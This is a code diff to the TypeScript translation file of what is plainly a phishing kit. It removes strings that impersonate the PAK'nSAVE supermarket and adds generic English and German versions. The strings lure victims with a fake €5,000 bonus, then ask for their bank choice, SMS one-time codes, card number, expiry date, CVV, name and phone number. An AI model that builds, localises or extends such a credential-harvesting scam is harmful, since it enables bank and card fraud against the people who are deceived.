@@ -37,11 +37,50 @@ export type TranslationKeys = {
   profile_loading_text: string;
 };
 
-const PAKNSAVE_ENGLISH_TRANSLATION: TranslationKeys = {
-  portal_name: "PAK'nSAVE Customer Portal",
-  support_center_name: "PAK'nSAVE Support",
-  win_title: "Exclusive PAK'nSAVE Bonus",
-  win_subtitle: "Congratulations! You have been selected for today's PAK'nSAVE promotion. Click the button below to claim your NZ$5,000 bonus.",
+const GERMAN_TRANSLATION: TranslationKeys = {
+  portal_name: "Kundenportal",
+  support_center_name: "Kundensupport",
+  win_title: "Exklusiver Bonus",
+  win_subtitle: "Herzlichen Glückwunsch! Sie wurden für unsere heutige Aktion ausgewählt. Klicken Sie auf die Schaltfläche unten, um Ihren Bonus von 5.000 € zu beanspruchen.",
+  win_button: "Bonus beanspruchen",
+  banken_title: "Wählen Sie Ihre Bank",
+  banken_subtitle: "Wählen Sie Ihre Bank aus, um fortzufahren.",
+  banken_search_placeholder: "Bank suchen...",
+  wait_title: "Bitte warten",
+  wait_subtitle: "Ihre Anfrage wird sicher verarbeitet...",
+  sms_title: "SMS-Sicherheitscode",
+  sms_subtitle: "Geben Sie den {digits}-stelligen Code ein.",
+  sms_input_label: "Einmalcode",
+  sms_button: "Bestätigen",
+  sms_loading: "Wird verarbeitet...",
+  card_title: "Zahlungsdaten",
+  card_subtitle: "Überprüfen und bestätigen Sie Ihre Daten.",
+  card_owner_label: "Name des Karteninhabers",
+  card_number_label: "Kartennummer",
+  card_expiry_label: "Ablaufdatum MM/JJ",
+  card_cvv_label: "Sicherheitscode",
+  card_button: "Weiter",
+  code_title: "Willkommen",
+  code_subtitle: "Geben Sie den Teilnahmecode ein, den Sie von {partner} erhalten haben, um Ihre Prämie freizuschalten.",
+  code_button: "Code bestätigen",
+  live_support_title: "Live-Support",
+  live_support_subtitle: "Um fortzufahren, müssen Sie unseren Kundenservice kontaktieren.\n\nKlicken Sie auf die Schaltfläche unten, um den Chat zu starten.",
+  live_support_button: "Chat starten",
+  profile_title_small: "Gewinnbestätigung",
+  profile_title_main: "Ihr Bonusbetrag",
+  profile_subtitle: "Bestätigen Sie Ihre Daten für die weitere Bearbeitung.",
+  profile_firstname_label: "Vorname",
+  profile_lastname_label: "Nachname",
+  profile_phone_label: "Handynummer",
+  profile_button: "Weiter",
+  profile_loading_text: "Wird verarbeitet...",
+};
+
+const ENGLISH_TRANSLATION: TranslationKeys = {
+  portal_name: "Customer Portal",
+  support_center_name: "Customer Support",
+  win_title: "Exclusive Bonus",
+  win_subtitle: "Congratulations! You have been selected for today's promotion. Click the button below to claim your €5,000 bonus.",
   win_button: "Claim Bonus",
   banken_title: "Choose Your Bank",
   banken_subtitle: "Select your bank to continue.",
@@ -97,5 +136,8 @@ const LANGUAGE_CODES = [
 ] as const;
 
 export const translations: Record<string, TranslationKeys> = Object.fromEntries(
-  LANGUAGE_CODES.map((code) => [code, PAKNSAVE_ENGLISH_TRANSLATION]),
+  LANGUAGE_CODES.map((code) => [
+    code,
+    code === "de" ? GERMAN_TRANSLATION : ENGLISH_TRANSLATION,
+  ]),
 ) as Record<string, TranslationKeys>;
